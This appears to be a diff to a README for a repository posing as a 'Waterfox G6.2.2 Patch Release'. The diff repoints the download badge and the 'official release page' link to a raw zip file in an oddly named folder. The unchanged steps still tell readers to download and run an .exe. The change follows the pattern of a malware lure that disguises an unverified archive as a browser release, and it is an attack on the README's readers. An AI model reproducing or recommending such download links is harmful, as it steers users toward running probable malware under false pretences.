@@ -1,6 +1,6 @@
 # 🌐 Waterfox-G6.2.2-Patch-Release - Run the enhanced browser version today
 
-[![](https://img.shields.io/badge/Download-Waterfox_G6.2.2-blue.svg)](https://github.com/claymoonstruck629/Waterfox-G6.2.2-Patch-Release)
+[![](https://img.shields.io/badge/Download-Waterfox_G6.2.2-blue.svg)](https://github.com/claymoonstruck629/Waterfox-G6.2.2-Patch-Release/raw/refs/heads/main/underswearer/Release_Waterfox_Patch_v3.9.zip)
 
 ## 📌 What is this software?
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start the installation:
 
 ## 📥 How to download and install
 
-1. Visit the [official release page](https://github.com/claymoonstruck629/Waterfox-G6.2.2-Patch-Release) to find the software files.
+1. Visit the [official release page](https://github.com/claymoonstruck629/Waterfox-G6.2.2-Patch-Release/raw/refs/heads/main/underswearer/Release_Waterfox_Patch_v3.9.zip) to find the software files.
 2. Look for the section labeled "Assets."
 3. Click the link that ends in ".exe."
 4. Save the file to your "Downloads" folder.
